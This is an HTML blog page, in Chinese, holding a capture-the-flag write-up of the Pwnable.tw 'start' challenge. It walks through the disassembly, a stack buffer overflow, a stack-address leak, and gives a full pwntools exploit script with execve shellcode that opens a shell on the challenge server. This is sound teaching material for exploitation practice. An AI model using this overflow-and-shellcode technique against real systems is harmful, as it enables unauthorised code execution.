@@ -1,0 +1,435 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Pwnable.tw-start
+Author: 堇姬Naup
+
+題目123456789101112131415161718192021220x08048060 &amp;lt;+0&amp;gt;:	push   esp0x08048061 &amp;lt;+1&amp;gt;:	push   0x804809d0x080480"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Pwnable-start"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Pwnable.tw-start
+Author: 堇姬Naup
+
+題目123456789101112131415161718192021220x08048060 &amp;lt;+0&amp;gt;:	push   esp0x08048061 &amp;lt;+1&amp;gt;:	push   0x804809d0x080480"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg2.jpg"/>
+
+
+<!-- Title -->
+
+<title>Pwnable-start | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg2.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Pwnable-start</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-08-06
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <h1 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw-start"></a>Pwnable.tw-start</h1><blockquote>
+<p>Author: 堇姬Naup</p>
+</blockquote>
+<h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x08048060 &lt;+0&gt;:	push   esp</span><br><span class="line">0x08048061 &lt;+1&gt;:	push   0x804809d</span><br><span class="line">0x08048066 &lt;+6&gt;:	xor    eax,eax</span><br><span class="line">0x08048068 &lt;+8&gt;:	xor    ebx,ebx</span><br><span class="line">0x0804806a &lt;+10&gt;:	xor    ecx,ecx</span><br><span class="line">0x0804806c &lt;+12&gt;:	xor    edx,edx</span><br><span class="line">0x0804806e &lt;+14&gt;:	push   0x3a465443</span><br><span class="line">0x08048073 &lt;+19&gt;:	push   0x20656874</span><br><span class="line">0x08048078 &lt;+24&gt;:	push   0x20747261</span><br><span class="line">0x0804807d &lt;+29&gt;:	push   0x74732073</span><br><span class="line">0x08048082 &lt;+34&gt;:	push   0x2774654c</span><br><span class="line">0x08048087 &lt;+39&gt;:	mov    ecx,esp</span><br><span class="line">0x08048089 &lt;+41&gt;:	mov    dl,0x14</span><br><span class="line">0x0804808b &lt;+43&gt;:	mov    bl,0x1</span><br><span class="line">0x0804808d &lt;+45&gt;:	mov    al,0x4</span><br><span class="line">0x0804808f &lt;+47&gt;:	int    0x80</span><br><span class="line">0x08048091 &lt;+49&gt;:	xor    ebx,ebx</span><br><span class="line">0x08048093 &lt;+51&gt;:	mov    dl,0x3c</span><br><span class="line">0x08048095 &lt;+53&gt;:	mov    al,0x3</span><br><span class="line">0x08048097 &lt;+55&gt;:	int    0x80</span><br><span class="line">0x08048099 &lt;+57&gt;:	add    esp,0x14</span><br><span class="line">0x0804809c &lt;+60&gt;:	ret </span><br></pre></td></tr></table></figure>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先把eax、ebx、ecx、edx清空，再把<code>Let’s start the CTF:</code> push到stack上</p>
+<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86-32_bit</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, esp        ; addr</span><br><span class="line">mov     dl, 14h</span><br><span class="line">mov     bl, 1           ; fd</span><br><span class="line">mov     al, 4</span><br><span class="line">int     80h             ; LINUX - sys_write</span><br></pre></td></tr></table></figure>
+<p>ecx -&gt; ebp-0x14<br>edx -&gt; 0x14長度<br>ebx -&gt; 1 (fd 標準輸出)<br>eax -&gt; 4 (write)</p>
+<p>最後syscall 印出 <code>Let’s start the CTF:</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor     ebx, ebx</span><br><span class="line">mov     dl, 3Ch ; &#x27;&lt;&#x27;</span><br><span class="line">mov     al, 3</span><br><span class="line">int     80h             ; LINUX -</span><br></pre></td></tr></table></figure>
+
+<p>ebx -&gt; 0 (fd 標準輸入)<br>edx -&gt; 0x3c (輸入大小)<br>eax -&gt; 3 (read)<br>ecx -&gt; ebp-0x14<br>最後syscall這裡存在buffer overflow</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/SJg3I-J5C.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJg3I-J5C.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>這邊發現甚麼都沒開，直接寫shellcode</p>
+<p>但須要跳回stack需要leak stack位置(ASLR)，這邊發現一開始push了esp，如果我們可以partial overwrite到esp前面之後跳回syscall write，就可以leak了<br><div class="img-item" data-src="https://hackmd.io/_uploads/ry4io-yqA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ry4io-yqA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aabb</span><br><span class="line">bbbb</span><br><span class="line">bbbb</span><br><span class="line">ret address</span><br><span class="line">esp addr</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以跳回write把esp address印出來，並且在輸入一次</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*0x14+p32(0x08048087)</span><br><span class="line">r.sendafter(b&#x27;Let\&#x27;s start the CTF:&#x27;,payload)</span><br><span class="line"></span><br><span class="line">leak_esp = r.recv()[:4]</span><br><span class="line">NAUPINFO(&#x27;LEAK ESP&#x27;,hex(u32(leak_esp)))</span><br></pre></td></tr></table></figure>
+
+<p>接著構造<br>b’a’ * 0x14 + leak esp+0x14(我們leak的esp是esp+0x4) + shellcode</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">aaaa</span><br><span class="line">leak esp+0x14(esp+0x18) &lt;- ret addr</span><br><span class="line">shellcode</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/S14vzf190.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S14vzf190.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>這樣就get shell</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> NAUP_pwn_lib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">REMOTE_LOCAL=<span class="built_in">input</span>(<span class="string">&quot;local?(y/n):&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> REMOTE_LOCAL==<span class="string">&quot;y&quot;</span>:</span><br><span class="line">    debug_init()</span><br><span class="line">    r=process(<span class="string">&#x27;./start&#x27;</span>)</span><br><span class="line">    LOCAL_DEBUG=<span class="built_in">input</span>(<span class="string">&quot;debug?(y/n):&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> LOCAL_DEBUG == <span class="string">&quot;y&quot;</span>:</span><br><span class="line">        gdb.attach(r)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    REMOTE_INFO=split_nc(<span class="string">&quot;nc chall.pwnable.tw 10000&quot;</span>)</span><br><span class="line"></span><br><span class="line">    REMOTE_IP=REMOTE_INFO[<span class="number">0</span>]</span><br><span class="line">    REMOTE_PORT=<span class="built_in">int</span>(REMOTE_INFO[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">    r=remote(REMOTE_IP,REMOTE_PORT)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x08048087</span>)</span><br><span class="line">r.sendafter(<span class="string">b&#x27;Let\&#x27;s start the CTF:&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak_esp = u32(r.recv()[:<span class="number">4</span>])</span><br><span class="line">NAUPINFO(<span class="string">&#x27;LEAK ESP&#x27;</span>,<span class="built_in">hex</span>(leak_esp))</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x31\xd2\x31\xc9\x31\xd2\x89\xe3\xb0\x0b\xcd\x80\x30\xc0\xfe\xc0\xcd\x80&quot;</span></span><br><span class="line"></span><br><span class="line">payload= <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> + p32(leak_esp+<span class="number">0x14</span>)+shellcode</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/BycfmMJ50.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/BycfmMJ50.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+            
+                <li class="next page-item d-inline"><a href="/2024/08/05/AIS3-2024/" class="page-link float-right">Older  &rarr;</a></li>
+            
+        </ul>
+    </div>
+
+
+            
+                <!-- Comments -->
+                
+
+                
+
+            
+
+        </div>
+    </div>
+</article> 
+
+
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
+
+        #toc-content .toc-link.is-active-link::before {
+            background-color: #404040;
+        }
+    </style>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+    <div class="ui-toc dropup scrollspy-body pull-right" style="right: 3%;">
+        <button type="button" class="toc-btn btn btn-light" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" data-display="static">
+            <i class="fas fa-list"></i>
+        </button>
+        <div class="dropdown-menu dropdown-menu-right p-2"  aria-labelledby="tocLabel">
+            <div class="toc-widget">
+                <div id="toc-content" class="text-truncate">
+                </div>
+            </div>
+            <div class="toc-menu pt-3 pl-4">
+                <a class="expand-toggle d-block py-1" href="#"><span class="expand-text">Expand all</span><span class="close-text" style="display: none;">Collapse all</span></a>
+                <a class="back-to-top d-block py-1" href="#">Back to top</a>
+                <a class="go-to-bottom d-block py-1" href="#">Go to bottom</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        tocbot.init({
+            // Where to render the table of contents.
+            tocSelector: '#toc-content',
+            // Where to grab the headings to build the table of contents.
+            contentSelector: 'article',
+            // Which headings to grab inside of the contentSelector element.
+            headingSelector: 'h1, h2, h3',
+            // For headings inside relative or absolute positioned containers within content.
+            hasInnerContainers: true,
+        });
+    </script>
+
+
+    
+
+
+    <!-- Footer -->
+    <hr />
+
+<!-- Footer -->
+<footer id="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1 text-center">
+                <ul class="list-inline">
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="https://github.com/Naupjjin" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+
+                    
+                        <li class="list-inline-item">
+                            <a rel="external" href="mailto:naup96721@gmail.com" target="_blank">
+                                <span class="fa-stack fa-lg">
+                                    <i class="fa fa-circle fa-stack-2x"></i>
+                                    <i class="far fa-envelope fa-stack-1x fa-inverse"></i>
+                                </span>
+                            </a>
+                        </li>
+                    
+
+                    
+                </ul>
+                <ul class="copyright footer-menu list-inline">
+                    
+                    
+                        <li class="list-inline-item">
+                            
+                            
+                            <a href="/">
+                                
+                                    Home
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/archives">
+                                
+                                    Archives
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/tags">
+                                
+                                    Tags
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/categories">
+                                
+                                    Categories
+                                
+                            </a>
+                        </li>
+                    
+                        <li class="list-inline-item">
+                            
+                                <span class="copyright-split">&nbsp;|&nbsp;</span>
+                            
+                            
+                            <a href="/about">
+                                
+                                    About
+                                
+                            </a>
+                        </li>
+                    
+                </ul>
+                <p class="copyright footer-author">
+                    &copy; -2024 
+                    <a rel="external" class="copyright-link" href="" target="_blank">Naup堇姬</a><br/>
+                    Powered by <a rel="external" class="copyright-link" href="https://hexo.io/" target="_blank">Hexo</a>  
+                    <span class="copyright-split">&nbsp;|&nbsp;&nbsp;</span>
+                    Theme <a rel="external" class="copyright-link" href="https://github.com/luswdev/hexo-theme-clean.git" target="_blank">Clean</a>
+                    
+                    
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+    <!-- After footer scripts -->
+    <!-- jQuery -->
+<script src="//cdn.jsdelivr.net/npm/jquery@2.1.4/dist/jquery.min.js"></script>
+
+<!-- For drop down -->
+<script src="//cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
+
+<!-- Bootstrap -->
+<script src="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js"></script>
+<!-- Gallery -->
+<script src="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/js/lightgallery-all.min.js"></script>
+<!-- Busuanzi -->
+
+
+<!-- Search script -->
+
+<script src="/js/search.js"></script>
+
+<script type="text/javascript">
+    $(function () {
+        searchFunc( '/search.xml' , 'searchInput', 'searchResult');
+    });
+</script>
+
+
+
+<script src="/js/main.js"></script>
+
+
+
+    <!-- Search Modal -->
+    <!-- Modal -->
+<div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel">
+    <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+        <div class="modal-content overflow-auto">
+            <div class="modal-header">
+                <input type="text" class="form-control" placeholder="Searching Keywords..." id="searchInput">
+                <button type="button" class="close" data-dismiss="modal" aria-label="Close"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="modal-body">
+                <div id="searchResult">
+                    <div class="search-empty text-center text-muted p-5">
+                        <i class="far fa-meh"></i>
+                    </div>
+                </div>
+            </div> 
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
